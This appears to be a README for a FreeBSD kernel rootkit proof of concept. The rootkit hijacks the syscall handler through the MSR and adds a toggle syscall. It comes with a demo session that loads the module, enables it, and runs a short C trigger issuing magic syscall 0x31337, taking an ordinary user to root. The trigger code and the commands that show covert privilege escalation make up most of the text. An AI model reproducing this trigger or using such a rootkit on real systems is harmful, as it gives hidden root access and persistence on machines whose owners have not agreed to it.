This is a POC for a *rootkit* that I wrote a long time ago that overwrites the MSR and hijack the original syscall handler in order to provide a 'hide' way to escalate the privileges. Additionally, the rootkit adds a new syscall that was created to handle the rootkit. This new syscall receives one argument, 1 or 0, enabling or disabling the rootkit.

Demonstration:

$ uname -a
FreeBSD rootkit 10.0-RELEASE FreeBSD 10.0-RELEASE #5: Wed Nov 26 17:05:04 BRT 2014     andersonc0d3@rootkit:/usr/obj/usr/src/sys/DEBUG  amd64
$ cat /etc/master.passwd
cat: /etc/master.passwd: Permission denied
$ id
uid=1001(andersonc0d3) gid=1001(andersonc0d3) groups=1001(andersonc0d3),0(wheel)
$ kldstat -v|grep rk.ko
 7    1 0xffffffff81a63000 2a0      rk.ko (./rk.ko)
$ perl -e 'syscall(210,1)'
$ cd rootkit_amd64
$ cat getroot.c
#include <stdio.h>
#include <stdlib.h>

int main(void){
	
	printf("uid: %d\n",getuid());

	asm("mov $0x31337,%rax");
	asm("syscall");

	return 0;
}
$ ./getroot
uid: 1001
$ id
uid=0(root) gid=0(wheel) groups=0(wheel)
$
